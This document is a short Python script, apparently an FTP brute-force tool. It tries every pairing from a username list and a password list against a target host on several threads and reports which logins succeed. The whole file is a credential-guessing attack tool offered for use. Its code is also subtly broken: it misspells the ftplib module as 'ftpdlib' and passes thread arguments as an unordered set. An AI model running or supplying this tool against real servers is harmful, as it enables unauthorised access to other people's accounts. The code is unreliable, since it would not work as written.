import sys
import ftplib
import threading
import queue

def ftp_brute(ipaddr, ports):
    ftp = ftpdlib.FTP()
    ftp.connect(ipaddr, int(ports))

    while not qu.empty():
        user_pass = qu.get()
        user_pass=user_pass.split('|')
        username = user_pass[0]
        passwd = user_pass[1]
        # print(username+' | '+passwd)
        try:
            ftp.login(username, passwd)
            list = ftp.retrlines('list')
            print(username + ' | ' + passwd+' Access')
        except ftplib.all_errors:
            print(username + ' | ' + passwd+' Denied')
            pass



if __name__ == '__main__':
    ip = sys.argv[1]
    port = sys.argv[2]
    userfile = sys.argv[3]
    passfile = sys.argv[4]
    threads = sys.argv[5]
    qu = queue.Queue()
    for username in open(userfile):
        for passwd in open(passfile):
            username=username.replace('\n','')
            passwd=passwd.replace('\n','')
            qu.put(username+'|'+passwd)
    for x in range(int(threads)):
        t = threading.Thread(target=ftp_brute,args={ip, int(port)})
        t.start()


